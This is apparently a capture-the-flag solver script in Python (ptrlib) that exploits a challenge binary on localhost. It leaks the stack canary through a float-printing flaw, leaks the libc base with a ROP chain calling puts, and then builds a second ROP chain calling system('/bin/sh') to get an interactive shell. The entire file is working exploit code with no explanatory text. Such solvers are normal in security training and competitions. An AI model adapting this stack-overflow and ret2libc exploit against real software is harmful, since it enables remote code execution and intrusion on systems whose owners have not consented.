from ptrlib import *

libc = ELF("../distfiles/libc.so.6")
elf = ELF("../distfiles/chall")
rop_ret = 0x00400e94
rop_pop_rdi = 0x00400e93

with Socket("localhost", 9002) as sock:
    sock.sendlineafter("> ", "taro")
    sock.sendlineafter("> ", "16")

    # leak canary
    sock.sendlineafter(": ", "+")
    r = sock.recvregex("to (\-*\d+\.\d+) seconds")
    sock.send("\n\n")
    if float(r[0]) == 0.0:
        logger.warn("Bad luck!")
        exit(1)
    canary = u64(p64(float(r[0])))
    logger.info("canary = " + hex(canary))

    # leak libc
    payload = b'A' * 0x18
    payload += p64(canary)
    payload += p64(0xdeadbeef)
    payload += p64(rop_pop_rdi)
    payload += p64(0x601ff0)
    payload += p64(elf.plt("puts"))
    payload += p64(elf.symbol("_start"))
    assert b'\n' not in payload
    assert b' ' not in payload
    sock.sendlineafter("(Y/n) ", payload)
    libc_base = u64(sock.recvline()) - libc.symbol("__libc_start_main")
    logger.info("libc = " + hex(libc_base))

    # get the shell
    payload = b'A' * 0x88
    payload += p64(canary)
    payload += p64(0xdeadbeef)
    payload += p64(rop_ret)
    payload += p64(rop_pop_rdi)
    payload += p64(libc_base + next(libc.find('/bin/sh')))
    payload += p64(libc_base + libc.symbol('system'))
    sock.sendlineafter("> ", payload)

    sock.interactive()
